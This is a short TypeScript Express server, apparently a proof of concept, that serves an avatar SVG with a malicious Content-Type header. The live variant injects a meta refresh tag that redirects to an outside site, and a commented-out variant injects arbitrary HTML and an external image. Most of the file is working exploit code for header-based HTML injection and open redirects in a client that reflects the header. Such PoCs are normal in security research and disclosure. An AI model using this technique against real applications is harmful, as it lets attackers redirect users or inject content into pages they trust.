import express, { NextFunction, Request, Response } from 'express';

const app = express();

app.use((req: Request, res: Response, next: NextFunction) => {
    console.log('Got req', req.method, req.url, req.headers);
    next();
});

app.use(express.json());

app.head('/avatar-html-2.svg', (req: Request, res: Response) => {
    console.log('Head Avatar');
    return res
        .setHeader('content-type', 'image/svg+xml')
        .send();
});

app.get('/avatar-html-2.svg', (req: Request, res: Response) => {
    console.log('Getting Avatar');

    // HTML Injection
    //res.writeHead(200, {
    //    'Cache-Control': 'no-cache, no-store, must-revalidate',
    //    'Expires': '0',
    //    'Content-Type': '"<div>Injected HTML</div><img alt="my-image" src="https://picsum.photos/500" /><!--'
    //});

    // Open Redirect
    res.writeHead(200, {
	'Cache-Control': 'no-cache, no-store, must-revalidate',
	'Expires': '0',
        'Content-Type': '"<div>a</div><meta http-equiv="refresh" content="0; url=https://www.google.com/"><!--'
    });

    res.end()
});

app.listen(3333, () => {
    console.log('poc listening on port 3333');
});